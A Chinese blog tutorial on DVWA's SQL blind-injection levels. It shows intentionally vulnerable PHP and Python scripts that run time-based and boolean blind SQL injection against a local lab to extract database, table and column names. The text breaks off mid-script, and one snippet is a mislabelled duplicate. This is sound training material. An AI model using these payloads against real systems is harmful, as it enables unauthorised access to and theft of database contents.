    <content type="html"><![CDATA[<p>总结了dvwa中的sql盲注关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$id=$_POST[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT first_name , last_name FROM users WHERE user_id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br><span class="line">if($row)&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>所谓的盲注，就是既没有报错信息，查询结果也始终如一甚至没有查询结果，也就是我们不知道会得到什么结果</p><p>我们就不能像之前一样自由选择注入方法，没有报错信息，也就是说报错注入不能用</p><p>没有查询结果，也就是说联合注入不能用</p><p>剩下的也就是盲注</p><p>盲注又可以分为基于时间的盲注和布尔型的盲注</p><p>从源代码来看，这关没有报错信息，查询结果为空和不为空返回的信息是不同的，我们就可以利用返回信息来判断有无返回结果</p><p>我们先输入1，发现有返回结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再输入1’，发现没有返回结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入1’#，发现有返回结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>说明id被单引号包裹，然后1是有查询结果的，然后我们就可以通用 1’ and 后面的语句进行盲注</p><p>and 后面的语句如果为真，则有返回结果，and 后面语句为假，则没有返回结果，我们可以在mysql命令行里先试着模拟注入语句</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>把and后面的语句修改为注入的逻辑语句，这就是布尔型的盲注，举个例子，我们可以用布尔型盲注判断数据库名字的长度</p><p>输入1’ and length(database())=4#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>而另一种基于时间的盲注，则是通过if(判断语句,1,sleep(5))来进行注入，如果判断语句为真，则不会sleep，为假则sleep 5秒</p><p>但是盲注的缺点就是一条一条试太麻烦了，这时候脚本的作用就体现出来了</p><p>我们先通过基于时间的盲注获取数据库名的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里r.elapsed.total_seconds()函数的作用是返回服务器接受请求到相应之间的时间，如果我们的判断语句length(database())=i 结果为真，则就不会sleep 5秒，t自然就小于5，就得到了数据库的长度</p><p>有了数据库名的长度，就可以获取数据库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>先获取数据库名长度的作用就是用来一位一位的截取数据库名的字符进行判断，如果等于一个ascii值则t&lt;5，这样一位一位的得到数据库名的字符</p><p>同样的方法获取数据表的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>获取数据表名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is:'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">3</span>):</span><br><span class="line">            table_name=table_name+chr(j)</span><br><span class="line">            print(<span class="string">'The name of table is:'</span>,table_name)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                table_name=table_name+<span class="string">','</span></span><br></pre></td></tr></table></figure><p>获取users表下数据列总长度：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        column_length=i</span><br><span class="line">        print(column_length)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里用了布尔型的盲注，由于数据列总长度可能较长，所以变量i的区间是通过反复尝试出来的</p><p>获取数据列名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            column_name=column_name+chr(j)</span><br><span class="line">            print(<span class="string">"The name of column is:"</span>,column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                column_name=column_name+<span class="string">','</span></span><br></pre></td></tr></table></figure><p>总结：大部分sql注入都是得不到想要的结果，也没有报错信息的，所以大部分情况下我们都要进行盲注，而盲注就强烈推荐使用脚本，可以非常好的节约时间和精力</p><p>下面贴上本关完整的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://127.0.0.1/demo/sqli(blind)-low.php'</span></span><br><span class="line">database_length=<span class="number">0</span></span><br><span class="line">table_length=<span class="number">0</span></span><br><span class="line">column_length=<span class="number">0</span></span><br><span class="line">database=<span class="string">''</span></span><br><span class="line">table_name=<span class="string">''</span></span><br><span class="line">column_name=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库长度:4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名:dvwa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表总长度:15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">16</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    print(t)</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        table_length=i</span><br><span class="line">        print(<span class="string">'The length of table is:'</span>,table_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表名:guestbook,users</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is:'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">3</span>):</span><br><span class="line">            table_name=table_name+chr(j)</span><br><span class="line">            print(<span class="string">'The name of table is:'</span>,table_name)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                table_name=table_name+<span class="string">','</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列总长度:94</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        column_length=i</span><br><span class="line">        print(column_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列名:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            column_name=column_name+chr(j)</span><br><span class="line">            print(<span class="string">"The name of column is:"</span>,column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                column_name=column_name+<span class="string">','</span></span><br></pre></td></tr></table></figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$id=$_POST[&apos;id&apos;];</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$sql=&quot;SELECT first_name,last_name FROM users where user_id=$id&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br><span class="line">if($row)&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>跟之前关卡区别只在于id未被引号包裹，稍微修改一下注入语句，跟之前关卡没什么区别，这里就不贴脚本了，参考上面的代码即可</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_SESSION[&apos;id&apos;]))&#123;</span><br><span class="line">$id=$_SESSION[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT first_name , last_name FROM users where user_id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br><span class="line">if($row)&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>有两个页面，一个页面用来接收post的id值并赋值给session的id值，主页面接受session的id值进行查询</p><p>这里的脚本需要特别注意一点，因为是两个页面，所以要把post的数据提交给input页面，然后再访问index主页面，这就需要利用到requests库的Session对象</p><p>以获取数据库名长度为例子说明：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>先创建一个Session对象，利用该对象将数据post到input页面，然后再通过Session对象访问index页面</p><p>其他的改法类似，就不一一赘述了</p><p>下面贴上本关完整脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_input=<span class="string">"http://127.0.0.1/demo/session-input.php"</span></span><br><span class="line">url_index=<span class="string">"http://127.0.0.1/demo/sqli(blind)-high.php"</span></span><br><span class="line"></span><br><span class="line">database_length=<span class="number">0</span></span><br><span class="line">table_length=<span class="number">0</span></span><br><span class="line">column_length=<span class="number">0</span></span><br><span class="line">database=<span class="string">''</span></span><br><span class="line">table_name=<span class="string">''</span></span><br><span class="line">column_name=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库长度:4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        